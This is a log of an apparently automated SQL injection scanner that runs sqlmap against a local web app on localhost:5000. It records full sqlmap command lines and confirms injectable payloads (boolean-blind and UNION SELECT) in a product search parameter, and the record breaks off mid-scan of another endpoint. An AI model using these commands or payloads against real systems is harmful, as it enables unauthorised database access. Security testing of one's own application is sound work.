2025-09-26 18:58:41,988 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:41,988 - INFO - 
2025-09-26 18:58:41,988 - INFO - [*] starting @ 18:58:41 /2025-09-26/
2025-09-26 18:58:41,988 - INFO - 
2025-09-26 18:58:43,842 - INFO - [18:58:43] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
2025-09-26 18:58:44,444 - INFO - [18:58:44] [INFO] testing connection to the target URL
2025-09-26 18:58:44,531 - INFO - [18:58:44] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:58:44,564 - INFO - [18:58:44] [INFO] testing if the target URL content is stable
2025-09-26 18:58:44,959 - INFO - [18:58:44] [INFO] target URL content is stable
2025-09-26 18:58:45,160 - INFO - [18:58:45] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
2025-09-26 18:58:45,199 - INFO - [18:58:45] [INFO] testing for SQL injection on GET parameter 'name'
2025-09-26 18:58:45,255 - INFO - [18:58:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:58:46,217 - INFO - [18:58:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:58:46,980 - INFO - [18:58:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:58:47,026 - INFO - [18:58:47] [INFO] GET parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
2025-09-26 18:58:47,272 - INFO - [18:58:47] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
2025-09-26 18:58:47,272 - INFO - it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 18:58:47,298 - INFO - [18:58:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 18:58:47,298 - INFO - [18:58:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 18:58:47,321 - INFO - [18:58:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
2025-09-26 18:58:47,363 - INFO - [18:58:47] [INFO] target URL appears to have 4 columns in query
2025-09-26 18:58:47,400 - INFO - [18:58:47] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
2025-09-26 18:58:47,410 - INFO - [18:58:47] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
2025-09-26 18:58:47,410 - INFO - [18:58:47] [WARNING] applying generic concatenation (CONCAT)
2025-09-26 18:58:47,438 - INFO - GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 18:58:47,454 - INFO - sqlmap identified the following injection point(s) with a total of 234 HTTP(s) requests:
2025-09-26 18:58:47,454 - INFO - ---
2025-09-26 18:58:47,454 - INFO - Parameter: name (GET)
2025-09-26 18:58:47,454 - INFO -     Type: boolean-based blind
2025-09-26 18:58:47,454 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
2025-09-26 18:58:47,454 - INFO -     Payload: name=test' OR NOT 3018=3018-- bBJW
2025-09-26 18:58:47,454 - INFO - 
2025-09-26 18:58:47,460 - INFO -     Type: UNION query
2025-09-26 18:58:47,460 - INFO -     Title: Generic UNION query (NULL) - 4 columns
2025-09-26 18:58:47,460 - INFO -     Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
2025-09-26 18:58:47,460 - INFO - ---
2025-09-26 18:58:47,460 - INFO - [18:58:47] [INFO] testing SQLite
2025-09-26 18:58:47,471 - INFO - [18:58:47] [INFO] confirming SQLite
2025-09-26 18:58:47,476 - INFO - [18:58:47] [INFO] actively fingerprinting SQLite
2025-09-26 18:58:47,491 - INFO - [18:58:47] [INFO] the back-end DBMS is SQLite
2025-09-26 18:58:47,491 - INFO - back-end DBMS: SQLite
2025-09-26 18:58:47,491 - INFO - [18:58:47] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:47,491 - INFO - 500 (Internal Server Error) - 88 times
2025-09-26 18:58:47,501 - INFO - [18:58:47] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'
2025-09-26 18:58:47,501 - INFO - 
2025-09-26 18:58:47,501 - INFO - [*] ending @ 18:58:47 /2025-09-26/
2025-09-26 18:58:47,501 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:41 /2025-09-26/

[18:58:43] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
[18:58:44] [INFO] testing connection to the target URL
[18:58:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:58:44] [INFO] testing if the target URL content is stable
[18:58:44] [INFO] target URL content is stable
[18:58:45] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[18:58:45] [INFO] testing for SQL injection on GET parameter 'name'
[18:58:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:58:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:58:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:58:47] [INFO] GET parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
[18:58:47] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:58:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:58:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:58:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:58:47] [INFO] target URL appears to have 4 columns in query
[18:58:47] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[18:58:47] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[18:58:47] [WARNING] applying generic concatenation (CONCAT)
GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 234 HTTP(s) requests:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: name=test' OR NOT 3018=3018-- bBJW

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
---
[18:58:47] [INFO] testing SQLite
[18:58:47] [INFO] confirming SQLite
[18:58:47] [INFO] actively fingerprinting SQLite
[18:58:47] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:58:47] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 88 times
[18:58:47] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'

[*] ending @ 18:58:47 /2025-09-26/

2025-09-26 18:58:47,670 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Search_for_a_product_discovery.log
2025-09-26 18:58:47,670 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --dbs
2025-09-26 18:58:51,033 - INFO -         ___
2025-09-26 18:58:51,035 - INFO -        __H__
2025-09-26 18:58:51,036 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:51,037 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:58:51,037 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:58:51,037 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:51,038 - INFO - 
2025-09-26 18:58:51,046 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:51,046 - INFO - 
2025-09-26 18:58:51,062 - INFO - [*] starting @ 18:58:51 /2025-09-26/
2025-09-26 18:58:51,062 - INFO - 
2025-09-26 18:58:52,787 - INFO - [18:58:52] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
2025-09-26 18:58:53,368 - INFO - [18:58:53] [INFO] resuming back-end DBMS 'sqlite'
2025-09-26 18:58:53,387 - INFO - [18:58:53] [INFO] testing connection to the target URL
2025-09-26 18:58:53,450 - INFO - sqlmap resumed the following injection point(s) from stored session:
2025-09-26 18:58:53,450 - INFO - ---
2025-09-26 18:58:53,450 - INFO - Parameter: name (GET)
2025-09-26 18:58:53,451 - INFO -     Type: boolean-based blind
2025-09-26 18:58:53,451 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
2025-09-26 18:58:53,452 - INFO -     Payload: name=test' OR NOT 3018=3018-- bBJW
2025-09-26 18:58:53,452 - INFO - 
2025-09-26 18:58:53,453 - INFO -     Type: UNION query
2025-09-26 18:58:53,454 - INFO -     Title: Generic UNION query (NULL) - 4 columns
2025-09-26 18:58:53,454 - INFO -     Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
2025-09-26 18:58:53,455 - INFO - ---
2025-09-26 18:58:53,460 - INFO - [18:58:53] [INFO] the back-end DBMS is SQLite
2025-09-26 18:58:53,461 - INFO - back-end DBMS: SQLite
2025-09-26 18:58:53,462 - INFO - [18:58:53] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
2025-09-26 18:58:53,462 - INFO - [18:58:53] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'
2025-09-26 18:58:53,463 - INFO - 
2025-09-26 18:58:53,463 - INFO - [*] ending @ 18:58:53 /2025-09-26/
2025-09-26 18:58:53,463 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:51 /2025-09-26/

[18:58:52] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
[18:58:53] [INFO] resuming back-end DBMS 'sqlite' 
[18:58:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: name=test' OR NOT 3018=3018-- bBJW

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
---
[18:58:53] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:58:53] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:58:53] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'

[*] ending @ 18:58:53 /2025-09-26/

2025-09-26 18:58:53,734 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Search_for_a_product_dbs.log
2025-09-26 18:58:53,734 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/test
2025-09-26 18:58:57,040 - INFO -         ___
2025-09-26 18:58:57,041 - INFO -        __H__
2025-09-26 18:58:57,041 - INFO -  ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:57,041 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 18:58:57,042 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:58:57,042 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:57,042 - INFO - 
2025-09-26 18:58:57,061 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:57,061 - INFO - 
2025-09-26 18:58:57,061 - INFO - [*] starting @ 18:58:57 /2025-09-26/
2025-09-26 18:58:57,061 - INFO - 
2025-09-26 18:58:59,360 - INFO - [18:58:59] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:58:59,360 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:58:59,360 - INFO - [18:58:59] [INFO] flushing session file
2025-09-26 18:58:59,371 - INFO - [18:58:59] [INFO] testing connection to the target URL
2025-09-26 18:58:59,434 - INFO - [18:58:59] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:58:59,434 - INFO - [18:58:59] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:58:59,444 - INFO - [18:58:59] [INFO] testing if the target URL content is stable
2025-09-26 18:58:59,883 - INFO - [18:58:59] [INFO] target URL content is stable
2025-09-26 18:58:59,892 - INFO - [18:58:59] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:58:59,917 - INFO - [18:58:59] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:58:59,938 - INFO - [18:58:59] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:58:59,956 - INFO - [18:58:59] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:59:00,002 - INFO - [18:59:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:00,125 - INFO - [18:59:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:00,147 - INFO - [18:59:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:00,205 - INFO - [18:59:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:59:00,243 - INFO - [18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:59:00,299 - INFO - [18:59:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:59:00,351 - INFO - [18:59:00] [INFO] testing 'Generic inline queries'
2025-09-26 18:59:00,366 - INFO - [18:59:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:59:00,406 - INFO - [18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:59:00,438 - INFO - [18:59:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:59:00,482 - INFO - [18:59:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:59:00,535 - INFO - [18:59:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:59:00,587 - INFO - [18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:59:00,665 - INFO - [18:59:00] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:59:00,722 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:59:00,722 - INFO - [18:59:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:59:00,771 - INFO - [18:59:00] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:59:00,839 - INFO - [18:59:00] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:59:00,839 - INFO - [18:59:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:59:00,849 - INFO - [18:59:00] [WARNING] HTTP error codes detected during run:
2025-09-26 18:59:00,849 - INFO - 500 (Internal Server Error) - 77 times, 404 (Not Found) - 4 times
2025-09-26 18:59:00,849 - INFO - 
2025-09-26 18:59:00,849 - INFO - [*] ending @ 18:59:00 /2025-09-26/
2025-09-26 18:59:00,849 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/test
--------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:57 /2025-09-26/

[18:58:59] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:58:59] [INFO] flushing session file
[18:58:59] [INFO] testing connection to the target URL
[18:58:59] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:58:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:58:59] [INFO] testing if the target URL content is stable
[18:58:59] [INFO] target URL content is stable
[18:58:59] [INFO] testing if URI parameter '#1*' is dynamic
[18:58:59] [INFO] URI parameter '#1*' appears to be dynamic
[18:58:59] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:58:59] [INFO] testing for SQL injection on URI parameter '#1*'
[18:59:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:59:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:59:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:59:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:59:00] [INFO] testing 'Generic inline queries'
[18:59:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:59:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:59:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:59:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:59:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:59:00] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:59:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:59:00] [WARNING] reflective value(s) found and filtering out
[18:59:00] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:59:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:59:00] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 77 times, 404 (Not Found) - 4 times

[*] ending @ 18:59:00 /2025-09-26/

2025-09-26 18:59:00,984 - INFO - Flushed sqlmap session for http://localhost:5000/products/test (log: attack-logs-dynamic\Get_a_specific_product_flush.log)
2025-09-26 18:59:00,984 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/products/test --output-dir 'attack-logs-dynamic\Get_a_specific_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 18:59:04,452 - INFO -         ___
2025-09-26 18:59:04,452 - INFO -        __H__
2025-09-26 18:59:04,452 - INFO -  ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:59:04,452 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:59:04,452 - INFO - |___|_  [)]_|_|_|__,|  _|
2025-09-26 18:59:04,452 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:59:04,452 - INFO - 
2025-09-26 18:59:04,468 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:59:04,468 - INFO - 
2025-09-26 18:59:04,468 - INFO - [*] starting @ 18:59:04 /2025-09-26/
2025-09-26 18:59:04,468 - INFO - 
2025-09-26 18:59:06,309 - INFO - [18:59:06] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_a_specific_product_sqlmap' as the output directory
2025-09-26 18:59:06,838 - INFO - [18:59:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:59:06,849 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:59:06,860 - INFO - [18:59:06] [INFO] testing connection to the target URL
2025-09-26 18:59:06,926 - INFO - [18:59:06] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:59:06,927 - INFO - [18:59:06] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:59:06,955 - INFO - [18:59:06] [INFO] testing if the target URL content is stable
2025-09-26 18:59:07,370 - INFO - [18:59:07] [INFO] target URL content is stable
2025-09-26 18:59:07,370 - INFO - [18:59:07] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:59:07,577 - INFO - [18:59:07] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:59:07,682 - INFO - [18:59:07] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:59:07,712 - INFO - [18:59:07] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:59:07,815 - INFO - [18:59:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:07,882 - INFO - [18:59:07] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:59:09,146 - INFO - [18:59:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:10,252 - INFO - [18:59:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:59:11,276 - INFO - [18:59:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:12,010 - INFO - [18:59:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:12,529 - INFO - [18:59:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:12,776 - INFO - [18:59:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:13,018 - INFO - [18:59:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:59:13,246 - INFO - [18:59:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:13,661 - INFO - [18:59:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:14,072 - INFO - [18:59:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:59:14,539 - INFO - [18:59:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:15,018 - INFO - [18:59:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:15,506 - INFO - [18:59:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:59:16,211 - INFO - [18:59:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:16,969 - INFO - [18:59:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:17,850 - INFO - [18:59:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:18,620 - INFO - [18:59:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:19,466 - INFO - [18:59:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:20,275 - INFO - [18:59:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:21,146 - INFO - [18:59:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:22,002 - INFO - [18:59:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:22,885 - INFO - [18:59:22] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:23,570 - INFO - [18:59:23] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:24,488 - INFO - [18:59:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:25,211 - INFO - [18:59:25] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:26,090 - INFO - [18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
